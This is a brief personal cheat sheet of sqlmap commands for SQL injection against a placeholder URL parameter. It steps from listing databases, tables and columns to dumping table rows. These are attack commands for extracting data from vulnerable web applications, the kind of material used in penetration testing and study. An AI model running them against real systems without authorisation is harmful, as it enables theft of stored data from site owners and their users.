# SQLMAP commands

This is a simple file for remind me some sqlmap instructions.

### Show databases
	sqlmap -u someurl.com/file.php?property=arg --dbs

### Show tables
	sqlmap -u someurl.com/file.php?property=arg -D SomeDatabase --tables

### Show columns
	sqlmap -u someurl.com/file.php?property=arg -D SomeDatabase -T someTable --columns

### Get rows of table
	sqlmap -u someurl.com/file.php?property=arg -D SomeDatabase -T someTable --dump
